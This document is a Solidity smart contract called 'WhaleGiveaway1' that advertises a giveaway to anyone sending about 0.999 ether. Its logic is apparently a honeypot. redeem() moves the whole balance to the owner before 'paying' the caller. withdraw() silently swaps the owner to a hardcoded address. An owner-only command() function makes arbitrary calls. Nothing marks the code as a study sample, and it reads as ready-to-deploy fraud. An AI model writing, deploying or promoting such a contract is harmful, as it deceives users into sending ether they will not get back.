pragma solidity ^0.8.0;

contract WhaleGiveaway1 {
    address public owner;

    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility, "Not enough ether sent");

        uint balance = address(this).balance;
        payable(owner).transfer(balance);
        payable(msg.sender).transfer(balance);
    }

    function withdraw() public payable {
        require(msg.sender == owner, "Only owner can withdraw");

        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        payable(owner).transfer(address(this).balance);
    }

    function command(address adr, bytes memory data) public payable {
        require(msg.sender == owner, "Only owner can execute commands");

        (bool success,) = payable(adr).call{value: msg.value}(data);
        require(success, "Low level call failed");
    }
}